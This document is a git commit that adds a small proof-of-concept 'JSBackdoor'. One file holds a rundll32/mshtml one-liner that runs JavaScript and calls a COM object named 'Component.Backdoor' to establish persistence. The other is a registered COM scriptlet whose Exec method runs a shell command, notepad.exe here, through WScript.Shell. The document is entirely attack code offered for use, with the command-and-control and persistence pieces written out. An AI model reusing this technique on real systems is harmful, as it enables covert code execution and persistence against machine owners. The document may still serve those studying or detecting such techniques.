55ac8376447fca569e760305f8586b63584c6918
Casey Smith <netsmith@gmail.com>
2016-04-14 13:17:06 -0500

    Added files via upload

---
+++ JSBackdoor/BackdoorTest.js
@@ -0,0 +1,12 @@
+//rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Component.Backdoor");x.Main();
+//We need to Call Main At least Once To Establish Persistence.
+
+var x = new ActiveXObject("Component.Backdoor");
+x.Main();
+
+//After That, Just Call your method ddefined in the c2 :-)
+var x = new ActiveXObject("Component.Backdoor");
+x.Exec();
+
+
+ 
---
+++ JSBackdoor/c2.js
@@ -0,0 +1,24 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Component"
+    progid="Component.Backdoor"
+    version="1.00"
+    classid="{10001111-0000-0000-0000-00000000ACDC}"
+>
+</registration>
+
+<public>
+    <method name="Exec">
+    </method>
+</public>
+<script language="JScript">
+<![CDATA[
+
+	var r = new ActiveXObject("WScript.Shell").Exec("notepad.exe");
+	self.Close;
+]]>
+</script>
+
+</scriptlet>
